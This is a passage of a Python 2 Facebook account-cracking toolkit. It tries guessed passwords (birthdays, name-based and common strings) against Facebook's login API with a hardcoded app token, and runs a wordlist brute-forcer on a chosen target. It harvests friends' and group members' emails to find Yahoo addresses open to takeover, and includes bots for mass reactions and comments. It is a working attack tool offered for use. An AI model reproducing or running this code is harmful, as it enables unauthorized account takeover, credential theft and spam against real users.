									cekpoint.append(user+pass3)
								else:
									#Pass4
									lahir = b['birthday']
									pass4 = lahir.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "sayang123"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "oiboy123"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name']+'doraemon321'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\033[1;91m[!] File not found")
		tanyaw()
def tanyaw():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] Wrong"
		tanyaw()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		tanyaw()
		
##### YAHOO CHECKER #####
#---------------------------------------------------#
def menu_yahoo():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	yahoo_pilih()
#----pilih
def yahoo_pilih():
	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if go =="":
		print "\033[1;91m[!] Wrong"
		yahoo_pilih()
	elif go =="1":
		yahoofriends()
	elif go =="2":
		yahoofromfriends()
	elif go =="3":
		yahoomember()
	elif go =="4":
		yahoolist()
	elif go =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		yahoo_pilih()
		
##### LIST FRIEND #####
def yahoofriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### CLONE FROM FRIEND #####
def yahoofromfriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] Friend not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/FriendMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
	
##### YAHOO MEMBER #####
def yahoomember():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
		
##### YAHOO FILE #####
def yahoolist():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
	

		
##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	bot_pilih()
#////////////
def bot_pilih():
	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if bots =="":
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		grup_react()
	elif bots =="3":
		bot_komen()
	elif bots =="4":
		grup_komen()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
		
##### MENU REACT #####
def menu_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	react_pilih()
#//////////////
def react_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		react_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		react()
	elif aksi =="2":
		tipe = "LOVE"
		react()
	elif aksi =="3":
		tipe = "WOW"
		react()
	elif aksi =="4":
		tipe = "HAHA"
		react()
	elif aksi =="5":
		tipe = "SAD"
		react()
	elif aksi =="6":
		tipe = "ANGRY"
		react()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		react_pilih()
#####NEXT
def react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksi.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### BOT REACT GRUP #####
def grup_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	reactg_pilih()
#//////////////
def reactg_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		reactg()
	elif aksi =="2":
		tipe = "LOVE"
		reactg()
	elif aksi =="3":
		tipe = "WOW"
		reactg()
	elif aksi =="4":
		tipe = "HAHA"
		reactg()
	elif aksi =="5":
		tipe = "SAD"
		reactg()
	elif aksi =="6":
		tipe = "ANGRY"
		reactg()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
#####NEXT
def reactg():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		grup_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksigrup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	
##### BOT KOMEN #####
def bot_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komen))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT KOMEN GRUP #####
def grup_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komengrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### HAPUS POST #####
def deletepost():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		nama = lol['name']
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
	jalan("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
	print 42*"\033[1;97m═"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
		except TypeError:
			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_bot()
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"\033[1;91m[!] No friend request"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
